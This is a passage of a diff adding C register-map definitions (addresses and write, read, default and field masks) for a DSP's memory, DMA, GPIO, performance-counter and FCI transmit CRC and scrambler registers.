+#define ME_XMEM_BAR7           DSP_MGMT_REG(0x0074)
+#define ME_XMEM_BAR7_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR7_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR7_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR7_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR8           DSP_MGMT_REG(0x0078)
+#define ME_XMEM_BAR8_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR8_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR8_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR8_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR9           DSP_MGMT_REG(0x007C)
+#define ME_XMEM_BAR9_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR9_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR9_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR9_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR10          DSP_MGMT_REG(0x0080)
+#define ME_XMEM_BAR10_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR10_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR10_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR10_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR11          DSP_MGMT_REG(0x0084)
+#define ME_XMEM_BAR11_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR11_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR11_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR11_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR12          DSP_MGMT_REG(0x0088)
+#define ME_XMEM_BAR12_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR12_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR12_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR12_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR13          DSP_MGMT_REG(0x008C)
+#define ME_XMEM_BAR13_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR13_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR13_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR13_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR14          DSP_MGMT_REG(0x0090)
+#define ME_XMEM_BAR14_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR14_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR14_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR14_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR15          DSP_MGMT_REG(0x0094)
+#define ME_XMEM_BAR15_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR15_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR15_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR15_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR16          DSP_MGMT_REG(0x0098)
+#define ME_XMEM_BAR16_WMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR16_MASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR16_DEFAULT  (0x1FFFFFE0)
+#define ME_XMEM_BAR16_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_ARB_MISC       DSP_MGMT_REG(0x009C)
+#define ME_XMEM_ARB_MISC_WMASK (0x0000)
+#define ME_XMEM_ARB_MISC_MASK  (0x000F)
+#define ME_XMEM_ARB_MISC_DEFAULT (0x0000)
+#define ME_XMEM_ARB_MISC_FMASK (0x000F)
+
+/* Dsp Ldstreg Address Constants */ 
+#define dsp_ldstreg_reg_base   (0x20000)
+#define DSP_LDSTREG_REG(r)     (int)(dsp_ldstreg_reg_base + (r))
+#define dsp_ldstreg_reg_size   (0x0080)
+
+#define D_VERSION              DSP_LDSTREG_REG(0x0000)
+#define D_VERSION_WMASK        (0x0000)
+#define D_VERSION_MASK         (0x0FFF)
+#define D_VERSION_DEFAULT      (0x0230)
+#define D_VERSION_FMASK        (0x0FFF)
+#define D_PORT_SEL             DSP_LDSTREG_REG(0x0004)
+#define D_PORT_SEL_WMASK       (0x1113311)
+#define D_PORT_SEL_MASK        (0x1113311)
+#define D_PORT_SEL_DEFAULT     (0x0000)
+#define D_PORT_SEL_FMASK       (0x1113311)
+#define D_INT_STAT             DSP_LDSTREG_REG(0x0008)
+#define D_INT_STAT_WMASK       (0x3333371)
+#define D_INT_STAT_MASK        (0x3333371)
+#define D_INT_STAT_DEFAULT     (0x0000)
+#define D_INT_STAT_FMASK       (0x0000)
+#define D_INT_MASK             DSP_LDSTREG_REG(0x000C)
+#define D_INT_MASK_WMASK       (0x3333371)
+#define D_INT_MASK_MASK        (0x3333371)
+#define D_INT_MASK_DEFAULT     (0x0000)
+#define D_INT_MASK_FMASK       (0x3333371)
+#define D_MEMEX_SRC            DSP_LDSTREG_REG(0x0010)
+#define D_MEMEX_SRC_WMASK      (0x000F)
+#define D_MEMEX_SRC_MASK       (0x000F)
+#define D_MEMEX_SRC_DEFAULT    (0x0000)
+#define D_MEMEX_SRC_FMASK      (0x000F)
+#define D_ARC2ME_INT           DSP_LDSTREG_REG(0x0014)
+#define D_ARC2ME_INT_WMASK     (0x0007)
+#define D_ARC2ME_INT_MASK      (0x0007)
+#define D_ARC2ME_INT_DEFAULT   (0x0000)
+#define D_ARC2ME_INT_FMASK     (0x0007)
+#define D_ARC2ME_STAT          DSP_LDSTREG_REG(0x0018)
+#define D_ARC2ME_STAT_WMASK    (0x0000)
+#define D_ARC2ME_STAT_MASK     (0x0007)
+#define D_ARC2ME_STAT_DEFAULT  (0x0000)
+#define D_ARC2ME_STAT_FMASK    (0x0007)
+#define D_GP_STAT              DSP_LDSTREG_REG(0x001C)
+#define D_GP_STAT_WMASK        (0xFFFFFFFF)
+#define D_GP_STAT_MASK         (0xFFFFFFFF)
+#define D_GP_STAT_DEFAULT      (0x0000)
+#define D_GP_STAT_FMASK        (0xFFFFFFFF)
+#define D_ME_CONFIG            DSP_LDSTREG_REG(0x0020)
+#define D_ME_CONFIG_WMASK      (0x0000)
+#define D_ME_CONFIG_MASK       (0x0001)
+#define D_ME_CONFIG_DEFAULT    (0x0000)
+#define D_ME_CONFIG_FMASK      (0x0001)
+#define D_MEMEXT_SEL           DSP_LDSTREG_REG(0x0024)
+#define D_MEMEXT_SEL_WMASK     (0x0000)
+#define D_MEMEXT_SEL_MASK      (0x0007)
+#define D_MEMEXT_SEL_DEFAULT   (0x0000)
+#define D_MEMEXT_SEL_FMASK     (0x0007)
+#define D_ADMA0_CTRL           DSP_LDSTREG_REG(0x0028)
+#define D_ADMA0_CTRL_WMASK     (0x0003)
+#define D_ADMA0_CTRL_MASK      (0x0003)
+#define D_ADMA0_CTRL_DEFAULT   (0x0000)
+#define D_ADMA0_CTRL_FMASK     (0x0003)
+#define D_ADMA0_STAT           DSP_LDSTREG_REG(0x002C)
+#define D_ADMA0_STAT_WMASK     (0x0000)
+#define D_ADMA0_STAT_MASK      (0x0007)
+#define D_ADMA0_STAT_DEFAULT   (0x0000)
+#define D_ADMA0_STAT_FMASK     (0x0007)
+#define D_ADMA0_SA_S           DSP_LDSTREG_REG(0x0030)
+#define D_ADMA0_SA_S_WMASK     (0x3FFFFE)
+#define D_ADMA0_SA_S_MASK      (0x3FFFFF)
+#define D_ADMA0_SA_S_DEFAULT   (0x0000)
+#define D_ADMA0_SA_S_FMASK     (0x3FFFFF)
+#define D_ADMA0_SA_E           DSP_LDSTREG_REG(0x0034)
+#define D_ADMA0_SA_E_WMASK     (0x3FFFFE)
+#define D_ADMA0_SA_E_MASK      (0x3FFFFF)
+#define D_ADMA0_SA_E_DEFAULT   (0x0000)
+#define D_ADMA0_SA_E_FMASK     (0x3FFFFF)
+#define D_ADMA0_DA_S           DSP_LDSTREG_REG(0x0038)
+#define D_ADMA0_DA_S_WMASK     (0x3FFFFE)
+#define D_ADMA0_DA_S_MASK      (0x3FFFFF)
+#define D_ADMA0_DA_S_DEFAULT   (0x0000)
+#define D_ADMA0_DA_S_FMASK     (0x3FFFFF)
+#define D_ADMA0_FILL_VAL       DSP_LDSTREG_REG(0x003C)
+#define D_ADMA0_FILL_VAL_WMASK (0xFFFFFFFF)
+#define D_ADMA0_FILL_VAL_MASK  (0xFFFFFFFF)
+#define D_ADMA0_FILL_VAL_DEFAULT (0x0000)
+#define D_ADMA0_FILL_VAL_FMASK (0xFFFFFFFF)
+#define D_ADMA1_CTRL           DSP_LDSTREG_REG(0x0040)
+#define D_ADMA1_CTRL_WMASK     (0x0003)
+#define D_ADMA1_CTRL_MASK      (0x0003)
+#define D_ADMA1_CTRL_DEFAULT   (0x0000)
+#define D_ADMA1_CTRL_FMASK     (0x0003)
+#define D_ADMA1_STAT           DSP_LDSTREG_REG(0x0044)
+#define D_ADMA1_STAT_WMASK     (0x0000)
+#define D_ADMA1_STAT_MASK      (0x0007)
+#define D_ADMA1_STAT_DEFAULT   (0x0000)
+#define D_ADMA1_STAT_FMASK     (0x0007)
+#define D_ADMA1_SA_S           DSP_LDSTREG_REG(0x0048)
+#define D_ADMA1_SA_S_WMASK     (0x3FFFFE)
+#define D_ADMA1_SA_S_MASK      (0x3FFFFF)
+#define D_ADMA1_SA_S_DEFAULT   (0x0000)
+#define D_ADMA1_SA_S_FMASK     (0x3FFFFF)
+#define D_ADMA1_SA_E           DSP_LDSTREG_REG(0x004C)
+#define D_ADMA1_SA_E_WMASK     (0x3FFFFE)
+#define D_ADMA1_SA_E_MASK      (0x3FFFFF)
+#define D_ADMA1_SA_E_DEFAULT   (0x0000)
+#define D_ADMA1_SA_E_FMASK     (0x3FFFFF)
+#define D_ADMA1_DA_S           DSP_LDSTREG_REG(0x0050)
+#define D_ADMA1_DA_S_WMASK     (0x3FFFFE)
+#define D_ADMA1_DA_S_MASK      (0x3FFFFF)
+#define D_ADMA1_DA_S_DEFAULT   (0x0000)
+#define D_ADMA1_DA_S_FMASK     (0x3FFFFF)
+#define D_ADMA1_FILL_VAL       DSP_LDSTREG_REG(0x0054)
+#define D_ADMA1_FILL_VAL_WMASK (0xFFFFFFFF)
+#define D_ADMA1_FILL_VAL_MASK  (0xFFFFFFFF)
+#define D_ADMA1_FILL_VAL_DEFAULT (0x0000)
+#define D_ADMA1_FILL_VAL_FMASK (0xFFFFFFFF)
+#define D_XDMA0_CTRL           DSP_LDSTREG_REG(0x0058)
+#define D_XDMA0_CTRL_WMASK     (0x0007)
+#define D_XDMA0_CTRL_MASK      (0x0007)
+#define D_XDMA0_CTRL_DEFAULT   (0x0000)
+#define D_XDMA0_CTRL_FMASK     (0x0007)
+#define D_XDMA0_STAT           DSP_LDSTREG_REG(0x005C)
+#define D_XDMA0_STAT_WMASK     (0x0000)
+#define D_XDMA0_STAT_MASK      (0x000F)
+#define D_XDMA0_STAT_DEFAULT   (0x0000)
+#define D_XDMA0_STAT_FMASK     (0x000F)
+#define D_XDMA0_SA_S           DSP_LDSTREG_REG(0x0060)
+#define D_XDMA0_SA_S_WMASK     (0x3FFFFFFE)
+#define D_XDMA0_SA_S_MASK      (0x3FFFFFFF)
+#define D_XDMA0_SA_S_DEFAULT   (0x0000)
+#define D_XDMA0_SA_S_FMASK     (0x3FFFFFFF)
+#define D_XDMA0_SA_E           DSP_LDSTREG_REG(0x0064)
+#define D_XDMA0_SA_E_WMASK     (0x3FFFFFFE)
+#define D_XDMA0_SA_E_MASK      (0x3FFFFFFF)
+#define D_XDMA0_SA_E_DEFAULT   (0x0000)
+#define D_XDMA0_SA_E_FMASK     (0x3FFFFFFF)
+#define D_XDMA0_DA_S           DSP_LDSTREG_REG(0x0068)
+#define D_XDMA0_DA_S_WMASK     (0x3FFFFFFE)
+#define D_XDMA0_DA_S_MASK      (0x3FFFFFFF)
+#define D_XDMA0_DA_S_DEFAULT   (0x0000)
+#define D_XDMA0_DA_S_FMASK     (0x3FFFFFFF)
+#define D_XDMA1_CTRL           DSP_LDSTREG_REG(0x006C)
+#define D_XDMA1_CTRL_WMASK     (0x0007)
+#define D_XDMA1_CTRL_MASK      (0x0007)
+#define D_XDMA1_CTRL_DEFAULT   (0x0000)
+#define D_XDMA1_CTRL_FMASK     (0x0007)
+#define D_XDMA1_STAT           DSP_LDSTREG_REG(0x0070)
+#define D_XDMA1_STAT_WMASK     (0x0000)
+#define D_XDMA1_STAT_MASK      (0x000F)
+#define D_XDMA1_STAT_DEFAULT   (0x0000)
+#define D_XDMA1_STAT_FMASK     (0x000F)
+#define D_XDMA1_SA_S           DSP_LDSTREG_REG(0x0074)
+#define D_XDMA1_SA_S_WMASK     (0x3FFFFFFE)
+#define D_XDMA1_SA_S_MASK      (0x3FFFFFFF)
+#define D_XDMA1_SA_S_DEFAULT   (0x0000)
+#define D_XDMA1_SA_S_FMASK     (0x3FFFFFFF)
+#define D_XDMA1_SA_E           DSP_LDSTREG_REG(0x0078)
+#define D_XDMA1_SA_E_WMASK     (0x3FFFFFFE)
+#define D_XDMA1_SA_E_MASK      (0x3FFFFFFF)
+#define D_XDMA1_SA_E_DEFAULT   (0x0000)
+#define D_XDMA1_SA_E_FMASK     (0x3FFFFFFF)
+#define D_XDMA1_DA_S           DSP_LDSTREG_REG(0x007C)
+#define D_XDMA1_DA_S_WMASK     (0x3FFFFFFE)
+#define D_XDMA1_DA_S_MASK      (0x3FFFFFFF)
+#define D_XDMA1_DA_S_DEFAULT   (0x0000)
+#define D_XDMA1_DA_S_FMASK     (0x3FFFFFFF)
+#define D_XDMA_GAP             DSP_LDSTREG_REG(0x0080)
+#define D_XDMA_GAP_WMASK       (0xFFFF)
+#define D_XDMA_GAP_MASK        (0xFFFF)
+#define D_XDMA_GAP_DEFAULT     (0x0000)
+#define D_XDMA_GAP_FMASK       (0xFFFF)
+#define D_XDATA_BASE_SH        DSP_LDSTREG_REG(0x0084)
+#define D_XDATA_BASE_SH_WMASK  (0x0000)
+#define D_XDATA_BASE_SH_MASK   (0x1FFFFFE0)
+#define D_XDATA_BASE_SH_DEFAULT (0x1FFFFFE0)
+#define D_XDATA_BASE_SH_FMASK  (0x1FFFFFE0)
+#define D_XDATA_BASE           DSP_LDSTREG_REG(0x0088)
+#define D_XDATA_BASE_WMASK     (0x0000)
+#define D_XDATA_BASE_MASK      (0x1FFFFFE0)
+#define D_XDATA_BASE_DEFAULT   (0x1FFFFFE0)
+#define D_XDATA_BASE_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR0            DSP_LDSTREG_REG(0x008C)
+#define D_XMEM_BAR0_WMASK      (0x0000)
+#define D_XMEM_BAR0_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR0_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR0_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR1            DSP_LDSTREG_REG(0x0090)
+#define D_XMEM_BAR1_WMASK      (0x0000)
+#define D_XMEM_BAR1_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR1_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR1_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR2            DSP_LDSTREG_REG(0x0094)
+#define D_XMEM_BAR2_WMASK      (0x0000)
+#define D_XMEM_BAR2_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR2_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR2_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR3            DSP_LDSTREG_REG(0x0098)
+#define D_XMEM_BAR3_WMASK      (0x0000)
+#define D_XMEM_BAR3_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR3_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR3_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR4            DSP_LDSTREG_REG(0x009C)
+#define D_XMEM_BAR4_WMASK      (0x0000)
+#define D_XMEM_BAR4_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR4_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR4_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR5            DSP_LDSTREG_REG(0x00A0)
+#define D_XMEM_BAR5_WMASK      (0x0000)
+#define D_XMEM_BAR5_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR5_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR5_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR6            DSP_LDSTREG_REG(0x00A4)
+#define D_XMEM_BAR6_WMASK      (0x0000)
+#define D_XMEM_BAR6_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR6_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR6_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR7            DSP_LDSTREG_REG(0x00A8)
+#define D_XMEM_BAR7_WMASK      (0x0000)
+#define D_XMEM_BAR7_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR7_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR7_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR8            DSP_LDSTREG_REG(0x00AC)
+#define D_XMEM_BAR8_WMASK      (0x0000)
+#define D_XMEM_BAR8_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR8_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR8_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR9            DSP_LDSTREG_REG(0x00B0)
+#define D_XMEM_BAR9_WMASK      (0x0000)
+#define D_XMEM_BAR9_MASK       (0x1FFFFFE0)
+#define D_XMEM_BAR9_DEFAULT    (0x1FFFFFE0)
+#define D_XMEM_BAR9_FMASK      (0x1FFFFFE0)
+#define D_XMEM_BAR10           DSP_LDSTREG_REG(0x00B4)
+#define D_XMEM_BAR10_WMASK     (0x0000)
+#define D_XMEM_BAR10_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR10_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR10_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR11           DSP_LDSTREG_REG(0x00B8)
+#define D_XMEM_BAR11_WMASK     (0x0000)
+#define D_XMEM_BAR11_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR11_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR11_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR12           DSP_LDSTREG_REG(0x00BC)
+#define D_XMEM_BAR12_WMASK     (0x0000)
+#define D_XMEM_BAR12_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR12_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR12_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR13           DSP_LDSTREG_REG(0x00C0)
+#define D_XMEM_BAR13_WMASK     (0x0000)
+#define D_XMEM_BAR13_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR13_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR13_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR14           DSP_LDSTREG_REG(0x00C4)
+#define D_XMEM_BAR14_WMASK     (0x0000)
+#define D_XMEM_BAR14_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR14_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR14_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR15           DSP_LDSTREG_REG(0x00C8)
+#define D_XMEM_BAR15_WMASK     (0x0000)
+#define D_XMEM_BAR15_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR15_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR15_FMASK     (0x1FFFFFE0)
+#define D_XMEM_BAR16           DSP_LDSTREG_REG(0x00CC)
+#define D_XMEM_BAR16_WMASK     (0x0000)
+#define D_XMEM_BAR16_MASK      (0x1FFFFFE0)
+#define D_XMEM_BAR16_DEFAULT   (0x1FFFFFE0)
+#define D_XMEM_BAR16_FMASK     (0x1FFFFFE0)
+#define D_GPIO_CTRL            DSP_LDSTREG_REG(0x00D0)
+#define D_GPIO_CTRL_WMASK      (0x3FFFF)
+#define D_GPIO_CTRL_MASK       (0x3FFFF)
+#define D_GPIO_CTRL_DEFAULT    (0x0000)
+#define D_GPIO_CTRL_FMASK      (0x3FFFF)
+#define D_GPIO_PW_CTRL         DSP_LDSTREG_REG(0x00D4)
+#define D_GPIO_PW_CTRL_WMASK   (0x000F)
+#define D_GPIO_PW_CTRL_MASK    (0x000F)
+#define D_GPIO_PW_CTRL_DEFAULT (0x0000)
+#define D_GPIO_PW_CTRL_FMASK   (0x000F)
+#define D_GPIO_DATA            DSP_LDSTREG_REG(0x00D8)
+#define D_GPIO_DATA_WMASK      (0xFFFF)
+#define D_GPIO_DATA_MASK       (0xFFFF)
+#define D_GPIO_DATA_DEFAULT    (0x0000)
+#define D_GPIO_DATA_FMASK      (0xFFFF)
+#define D_XMEM_LAT             DSP_LDSTREG_REG(0x00DC)
+#define D_XMEM_LAT_WMASK       (0x0FF1)
+#define D_XMEM_LAT_MASK        (0x0FF1)
+#define D_XMEM_LAT_DEFAULT     (0x0000)
+#define D_XMEM_LAT_FMASK       (0x0FF1)
+#define D_IC_MISSES            DSP_LDSTREG_REG(0x00E0)
+#define D_IC_MISSES_WMASK      (0x7FFFFFF)
+#define D_IC_MISSES_MASK       (0x7FFFFFF)
+#define D_IC_MISSES_DEFAULT    (0x0000)
+#define D_IC_MISSES_FMASK      (0x7FFFFFF)
+#define D_IC_MISS_LAT          DSP_LDSTREG_REG(0x00E4)
+#define D_IC_MISS_LAT_WMASK    (0xFFFFFFFF)
+#define D_IC_MISS_LAT_MASK     (0xFFFFFFFF)
+#define D_IC_MISS_LAT_DEFAULT  (0x0000)
+#define D_IC_MISS_LAT_FMASK    (0xFFFFFFFF)
+#define D_PER_IC_MISS_LAT      DSP_LDSTREG_REG(0x00E8)
+#define D_PER_IC_MISS_LAT_WMASK (0xFFFF)
+#define D_PER_IC_MISS_LAT_MASK (0xFFFF)
+#define D_PER_IC_MISS_LAT_DEFAULT (0x0000)
+#define D_PER_IC_MISS_LAT_FMASK (0xFFFF)
+#define D_XMEM_DATA_ACCS       DSP_LDSTREG_REG(0x00EC)
+#define D_XMEM_DATA_ACCS_WMASK (0xFFFFFFFF)
+#define D_XMEM_DATA_ACCS_MASK  (0xFFFFFFFF)
+#define D_XMEM_DATA_ACCS_DEFAULT (0xC0000000)
+#define D_XMEM_DATA_ACCS_FMASK (0xFFFFFFFF)
+#define D_XMEM_DATA_CLKS       DSP_LDSTREG_REG(0x00F0)
+#define D_XMEM_DATA_CLKS_WMASK (0xFFFFFFFF)
+#define D_XMEM_DATA_CLKS_MASK  (0xFFFFFFFF)
+#define D_XMEM_DATA_CLKS_DEFAULT (0x0000)
+#define D_XMEM_DATA_CLKS_FMASK (0xFFFFFFFF)
+
+/* Fc Memory Address Constants */ 
+#define fc_cwram_base          (0x20C000)
+#define fc_cwram_mask          (0xFFFF)
+#define fc_cwram_size          (0x0400)
+#define fc_cwram_default       (0x0000)
+
+/* Fci Memory Address Constants */ 
+#define fci_glbtx_base         (0x20D800)
+#define fci_glbtx_mask         (0xFFFFFFFF)
+#define fci_glbtx_size         (0x0400)
+#define fci_glbtx_default      (0x0000)
+#define fci_glbrx_base         (0x20DC00)
+#define fci_glbrx_mask         (0xFFFFFFFF)
+#define fci_glbrx_size         (0x0400)
+#define fci_glbrx_default      (0x0000)
+
+/* Fci Glbtx Address Constants */ 
+#define fci_glbtx_reg_base     (0x20D800)
+#define FCI_GLBTX_REG(r)       (int)(fci_glbtx_reg_base + (r))
+#define fci_glbtx_reg_size     (0x0001)
+
+#define ZT_R0                  FCI_GLBTX_REG(0x0000)
+#define ZT_R0_WMASK            (0xFFFFFFFF)
+#define ZT_R0_MASK             (0xFFFFFFFF)
+#define ZT_R0_DEFAULT          (0x0000)
+#define ZT_R0_FMASK            (0xFFFFFFFF)
+#define ZT_R4                  FCI_GLBTX_REG(0x0004)
+#define ZT_R4_WMASK            (0xFFFFFFFF)
+#define ZT_R4_MASK             (0xFFFFFFFF)
+#define ZT_R4_DEFAULT          (0x0000)
+#define ZT_R4_FMASK            (0xFFFFFFFF)
+#define ZT_R8                  FCI_GLBTX_REG(0x0008)
+#define ZT_R8_WMASK            (0xFFFFFFFF)
+#define ZT_R8_MASK             (0xFFFFFFFF)
+#define ZT_R8_DEFAULT          (0x0000)
+#define ZT_R8_FMASK            (0xFFFFFFFF)
+#define ZT_R12                 FCI_GLBTX_REG(0x000C)
+#define ZT_R12_WMASK           (0xFFFFFFFF)
+#define ZT_R12_MASK            (0xFFFFFFFF)
+#define ZT_R12_DEFAULT         (0x0000)
+#define ZT_R12_FMASK           (0xFFFFFFFF)
+#define ZT_CODEWORD            FCI_GLBTX_REG(0x0010)
+#define ZT_CODEWORD_WMASK      (0xFFFFFFFF)
+#define ZT_CODEWORD_MASK       (0xFFFFFFFF)
+#define ZT_CODEWORD_DEFAULT    (0x0000)
+#define ZT_CODEWORD_FMASK      (0xFFFFFFFF)
+#define ZT_VBC_SIZE            FCI_GLBTX_REG(0x0014)
+#define ZT_VBC_SIZE_WMASK      (0xFFFFFFFF)
+#define ZT_VBC_SIZE_MASK       (0xFFFFFFFF)
+#define ZT_VBC_SIZE_DEFAULT    (0x0000)
+#define ZT_VBC_SIZE_FMASK      (0xFFFFFFFF)
+#define ZT_FRAMING             FCI_GLBTX_REG(0x0018)
+#define ZT_FRAMING_WMASK       (0xFFFFFFFF)
+#define ZT_FRAMING_MASK        (0xFFFFFFFF)
+#define ZT_FRAMING_DEFAULT     (0x0000)
+#define ZT_FRAMING_FMASK       (0xFFFFFFFF)
+#define ZT_OHRATE              FCI_GLBTX_REG(0x001C)
+#define ZT_OHRATE_WMASK        (0xFFFFFFFF)
+#define ZT_OHRATE_MASK         (0xFFFFFFFF)
+#define ZT_OHRATE_DEFAULT      (0x0000)
+#define ZT_OHRATE_FMASK        (0xFFFFFFFF)
+#define ZT_FLAG_CTRL0          FCI_GLBTX_REG(0x0020)
+#define ZT_FLAG_CTRL0_WMASK    (0x77777777)
+#define ZT_FLAG_CTRL0_MASK     (0x77777777)
+#define ZT_FLAG_CTRL0_DEFAULT  (0x0000)
+#define ZT_FLAG_CTRL0_FMASK    (0x77777777)
+#define ZT_FLAG_CTRL1          FCI_GLBTX_REG(0x0024)
+#define ZT_FLAG_CTRL1_WMASK    (0x7777077)
+#define ZT_FLAG_CTRL1_MASK     (0x7777077)
+#define ZT_FLAG_CTRL1_DEFAULT  (0x0000)
+#define ZT_FLAG_CTRL1_FMASK    (0x7777077)
+#define ZT_CRC0                FCI_GLBTX_REG(0x0028)
+#define ZT_CRC0_WMASK          (0xFFFFFFFF)
+#define ZT_CRC0_MASK           (0xFFFFFFFF)
+#define ZT_CRC0_DEFAULT        (0x0000)
+#define ZT_CRC0_FMASK          (0xFFFFFFFF)
+#define ZT_CRC_POLY0           FCI_GLBTX_REG(0x002C)
+#define ZT_CRC_POLY0_WMASK     (0xFFFFFFFF)
+#define ZT_CRC_POLY0_MASK      (0xFFFFFFFF)
+#define ZT_CRC_POLY0_DEFAULT   (0x0000)
+#define ZT_CRC_POLY0_FMASK     (0xFFFFFFFF)
+#define ZT_CRC_CTRL0           FCI_GLBTX_REG(0x0030)
+#define ZT_CRC_CTRL0_WMASK     (0xFFFF0103)
+#define ZT_CRC_CTRL0_MASK      (0xFFFF0103)
+#define ZT_CRC_CTRL0_DEFAULT   (0x0000)
+#define ZT_CRC_CTRL0_FMASK     (0xFFFF0103)
+#define ZT_CRC1                FCI_GLBTX_REG(0x0034)
+#define ZT_CRC1_WMASK          (0xFFFFFFFF)
+#define ZT_CRC1_MASK           (0xFFFFFFFF)
+#define ZT_CRC1_DEFAULT        (0x0000)
+#define ZT_CRC1_FMASK          (0xFFFFFFFF)
+#define ZT_CRC_POLY1           FCI_GLBTX_REG(0x0038)
+#define ZT_CRC_POLY1_WMASK     (0xFFFFFFFF)
+#define ZT_CRC_POLY1_MASK      (0xFFFFFFFF)
+#define ZT_CRC_POLY1_DEFAULT   (0x0000)
+#define ZT_CRC_POLY1_FMASK     (0xFFFFFFFF)
+#define ZT_CRC_CTRL1           FCI_GLBTX_REG(0x003C)
+#define ZT_CRC_CTRL1_WMASK     (0xFFFF0103)
+#define ZT_CRC_CTRL1_MASK      (0xFFFF0103)
+#define ZT_CRC_CTRL1_DEFAULT   (0x0000)
+#define ZT_CRC_CTRL1_FMASK     (0xFFFF0103)
+#define ZT_SCR                 FCI_GLBTX_REG(0x0040)
+#define ZT_SCR_WMASK           (0xFFFFFFFF)
+#define ZT_SCR_MASK            (0xFFFFFFFF)
+#define ZT_SCR_DEFAULT         (0x0000)
+#define ZT_SCR_FMASK           (0xFFFFFFFF)
+#define ZT_SCR_POLY            FCI_GLBTX_REG(0x0044)
+#define ZT_SCR_POLY_WMASK      (0xFFFFFFFF)
+#define ZT_SCR_POLY_MASK       (0xFFFFFFFF)
+#define ZT_SCR_POLY_DEFAULT    (0x0000)
+#define ZT_SCR_POLY_FMASK      (0xFFFFFFFF)
+#define ZT_SCR_CTRL            FCI_GLBTX_REG(0x0048)
+#define ZT_SCR_CTRL_WMASK      (0x001F)
+#define ZT_SCR_CTRL_MASK       (0x001F)
+#define ZT_SCR_CTRL_DEFAULT    (0x0000)
+#define ZT_SCR_CTRL_FMASK      (0x001F)
+#define ZT_SCR_STATE           FCI_GLBTX_REG(0x004C)
+#define ZT_SCR_STATE_WMASK     (0x3FFFFFF)
+#define ZT_SCR_STATE_MASK      (0x3FFFFFF)
